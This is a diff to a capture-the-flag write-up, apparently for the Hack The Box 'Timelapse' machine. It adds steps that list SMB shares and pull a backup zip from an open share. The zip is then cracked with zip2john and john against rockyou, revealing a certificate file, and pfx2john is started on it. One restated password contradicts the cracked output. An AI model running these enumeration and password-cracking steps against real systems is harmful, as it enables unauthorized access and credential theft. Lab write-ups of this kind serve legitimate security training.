@@ -62,7 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 79.49 seconds
 SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
 ```
 # SMB Enumeration
-- List available shared folders using `crakmapexec`.
+List available shared folders using `crakmapexec`.
 ```CSS
 ▶ crackmapexec smb 10.10.11.152 --shares
 ```
@@ -80,4 +80,63 @@ SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763
         NETLOGON        Disk      Logon server share 
         Shares          Disk      
         SYSVOL          Disk      Logon server share 
+```
+- Connect to the SMB share name "Shares".
+```CSS
+▶ smbclient //10.10.11.152/Shares
+
+smb: \> ls
+  .                                   D        0  Mon Oct 25 21:09:15 2021
+  ..                                  D        0  Mon Oct 25 21:09:15 2021
+  Dev                                 D        0  Tue Oct 26 01:10:06 2021
+  HelpDesk                            D        0  Mon Oct 25 21:18:42 2021
+
+smb: \> cd Dev
+smb: \Dev\> ls
+  .                                   D        0  Tue Oct 26 01:10:06 2021
+  ..                                  D        0  Tue Oct 26 01:10:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 21:16:42 2021
+
+                6367231 blocks of size 4096. 2465596 blocks available
+smb: \Dev\> get winrm_backup.zip
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec)
+```
+- Downloaded the zip file `winrm_backup.zip` with the "Dev" directory.
+
+# Crack ZIP Hash
+```CSS
+▶ zip2john winrm_backup.zip > winrm_backup.hash
+ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
+```
+```CSS
+▶ john winrm_backup.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:00 DONE (2023-08-02 19:28) 3.125g/s 10841Kp/s 10841Kc/s 10841KC/s surkerior..suppamas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+▶ john winrm_backup.hash -show 
+winrm_backup.zip/legacyy_dev_auth.pfx:supremelegacy:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
+
+1 password hash cracked, 0 left
+```
+- Password: superemelegacy
+# Unzip the ZIP
+```CSS
+▶ unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+  inflating: legacyy_dev_auth.pfx
+```
+- File: `legacyy_dev_auth.pfx`
+# Crack PFX hash
+```CSS
+▶ pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.hash
+```
+```CSS
+
 ```
